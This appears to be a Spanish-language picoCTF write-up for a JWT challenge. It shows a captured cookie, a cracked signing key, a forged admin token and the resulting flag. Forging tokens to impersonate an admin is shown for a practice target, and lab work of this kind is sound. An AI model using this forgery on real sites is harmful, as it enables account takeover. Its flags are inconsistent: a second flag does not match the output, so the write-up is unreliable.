
## Descripción

*Check the admin scratchpad! `https://jupiter.challenges.picoctf.org/problem/63090/` or http://jupiter.challenges.picoctf.org:63090*

## Pistas

*What is that cookie?*
*Have you heard of JWT?*

## Solución

*Cookie Editor, JWT*
```
#Cookie Original
eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiY2VjeSJ9.a1kh1HNwwyCOwOQUN04noW_rGkq3zubtw8uyhZOdexI

#JWT
{
  "typ": "JWT",
  "alg": "HS256"
}
{
  "user": "admin"
}
#Aqui habia en vez de ilovepico era secret pero para crackearla se pone ilovepico
a-string-ilovepico-at-least-256-bits-long
#Cookie modificada
eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiYWRtaW4ifQ.gtqDl4jVDvNbEe_JYEZTN19Vx6X9NNZtRVbKPBkhO-s

#Recargamos pagina
## Hello admin!

Here is your JaWT scratchpad!
	picoCTF{jawt_was_just_what_you_thought_f859ab2f} 
[](https://jupiter.challenges.picoctf.org/logout)

## Register with your name!
```

picoCTF{th4ts_4_l0t_0f_pl4c3s_2_lO0k_35844447}

## Notas Adicionales 

*Accedemos al sitio, ponemos nuestro nombre, después con la extensión de cookie editor, buscamos la cookie jwt y copiamos el token, lo decodificamos en jwt.io, le cambiamos el nombre por "admin" y donde esta "secret" le pondremos ilovepico, al darnos una nueva cookie, la copiamos y pegamos, guardamos, recargamos y da la bandera.*

## Referencias 

http://jupiter.challenges.picoctf.org:63090
https://jwt.io/
